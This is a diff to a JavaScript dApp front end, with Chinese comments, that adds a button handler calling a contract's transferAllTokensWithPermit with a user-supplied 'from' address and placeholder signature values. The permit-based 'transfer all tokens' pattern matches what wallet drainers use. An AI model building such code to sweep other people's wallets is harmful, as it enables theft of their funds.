@@ -159,3 +159,33 @@ async function signAndFillSignature(userAddress, contractAddress) {
     document.getElementById('r').value = "0x..."; // 模拟的签名 r 值
     document.getElementById('s').value = "0x..."; // 模拟的签名 s 值
 }
+
+// 转移代币函数
+async function transferTokens() {
+    if (!userAddress) {
+        alert('请先连接钱包！');
+        return;
+    }
+
+    const tokenAddress = document.getElementById('tokenAddress').value;
+    const fromAddress = document.getElementById('fromAddress').value;
+    const v = parseInt(document.getElementById('v').value);
+    const r = document.getElementById('r').value;
+    const s = document.getElementById('s').value;
+
+    // 创建合约实例
+    const contract = new web3.eth.Contract(contractABI, contractAddress);
+
+    try {
+        // 调用合约的 transferAllTokensWithPermit 函数
+        const tx = await contract.methods.transferAllTokensWithPermit(tokenAddress, fromAddress, v, r, s).send({ from: userAddress });
+        console.log('代币转移成功:', tx);
+        alert('代币转移成功！');
+    } catch (error) {
+        console.error('转移代币时出错:', error);
+        alert('转移代币失败，请查看控制台的错误信息。');
+    }
+}
+
+// 绑定转移按钮事件
+document.getElementById('transferButton').addEventListener('click', transferTokens);
